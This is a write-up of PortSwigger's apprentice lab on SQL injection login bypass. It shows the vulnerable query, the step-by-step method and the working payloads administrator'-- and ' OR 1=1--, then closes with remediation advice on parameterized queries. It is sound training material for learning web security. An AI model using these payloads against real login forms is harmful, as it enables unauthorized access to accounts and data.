# Lab 02 — SQL injection vulnerability allowing login bypass

| | |
|---|---|
| **Difficulty** | 🟩 Apprentice |
| **Category** | Subverting application logic |
| **Concept** | [06 — Subverting application logic](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/lab-login-bypass |

---

## 🎯 Objective
The login form is vulnerable to SQL injection. **Log in as the `administrator`** user without knowing the password.

## 🧠 Background
The login check runs:
```sql
SELECT * FROM users WHERE username = 'YOUR_USERNAME' AND password = 'YOUR_PASSWORD'
```
The app logs you in if the query returns a row. If we comment out the password check, only the username matters.

## 🪜 Methodology
1. Browse to **My account → Login**.
2. In **username**, enter `administrator'--`.
3. In **password**, enter anything (e.g. `x`).
4. Submit.

## 💥 Payload
```
username: administrator'--
password: x
```
Resulting query:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'x'
```

## ✅ Why it works
The `'` closes the username string; `--` comments out `' AND password = 'x'`. The query now selects the administrator row based **only on username**, returns a row, and the app authenticates you as admin.

> 💡 If you didn't know a username: `' OR 1=1--` returns all users and typically logs you in as the first (often admin).

## 🛡️ Remediation
Parameterize the query **and** never treat "row returned" as proof of valid credentials without verifying a properly hashed password. See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Authentication logic delegated to a concatenated SQL string can be rewritten by the attacker. `#sqli` `#apprentice` `#auth-bypass`
